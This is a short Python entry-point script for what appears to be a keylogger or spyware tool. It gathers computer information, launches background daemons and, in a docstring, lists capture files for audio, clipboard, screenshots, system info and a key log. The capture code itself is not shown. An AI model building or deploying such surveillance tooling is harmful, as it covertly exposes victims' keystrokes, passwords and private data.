from src.applications.common.logger_handler import Logger
from src.applications.daemons.make import make_daemons
from src.applications.computer_information import get_computer_information
from src.config import config
from src.main import Main

if __name__ == "__main__":
    get_computer_information(config, Logger("ComputerInfo"))
    Main(Logger("Main"), make_daemons(config)).init()

"""
"AUDIO_INFORMATION_E": "e_audio.wav",
"SYSTEM_INFORMATION_E": "e_systeminfo.txt",
"CLIPBOARD_INFORMATION_E": "e_clipboard.txt",
"SCREENSHOT_INFORMATION_E": "e_screenshot.png",
"KEYS_INFORMATION_E": "e_key_log.txt",
"""
